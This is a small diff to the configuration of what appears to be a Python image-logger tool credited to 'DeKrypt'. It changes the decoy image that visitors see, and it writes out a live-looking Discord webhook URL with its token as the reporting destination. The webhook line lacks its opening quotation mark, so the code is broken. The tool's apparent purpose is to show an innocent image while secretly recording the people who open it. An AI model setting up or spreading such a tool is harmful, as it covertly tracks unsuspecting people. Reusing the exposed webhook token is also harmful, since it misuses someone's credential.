@@ -11,7 +11,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": https://discord.com/api/webhooks/1384959221224701953/3ISlr4I3dyx0aZkQMEbgynmekk7IxisslLRrvOQPEa_WUmWWc3fSdcECe19xDQ9HgOE0",
-    "image": "https://www.bing.com/images/search?view=detailV2&ccid=A2e%2Ffsdh&id=DF95CEFC51D505CA3A1A8FF6FDDD3D150A7C0A74&thid=OIP.A2e_fsdhI2d8tRbSDil-QgHaEK&mediaurl=https%3A%2F%2Fstatic.wikia.nocookie.net%2F26eea879-f7f9-4bcb-9a01-be3618b7b2b5&cdnurl=https%3A%2F%2Fth.bing.com%2Fth%2Fid%2FR.0367bf7ec76123677cb516d20e297e42%3Frik%3DdAp8ChU93f32jw%26pid%3DImgRaw%26r%3D0&exph=720&expw=1280&q=discord+mod+&simid=608026581214506285&FORM=IRPRST&ck=414F5A192390E54312D4F2902B33FC22&selectedIndex=3&itb=0&cw=1721&ch=866&ajaxhist=0&ajaxserp=0", # You can also have a custom image by using a URL argument
+    "image": "https://wallpaperaccess.com/windows-xp-bliss", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
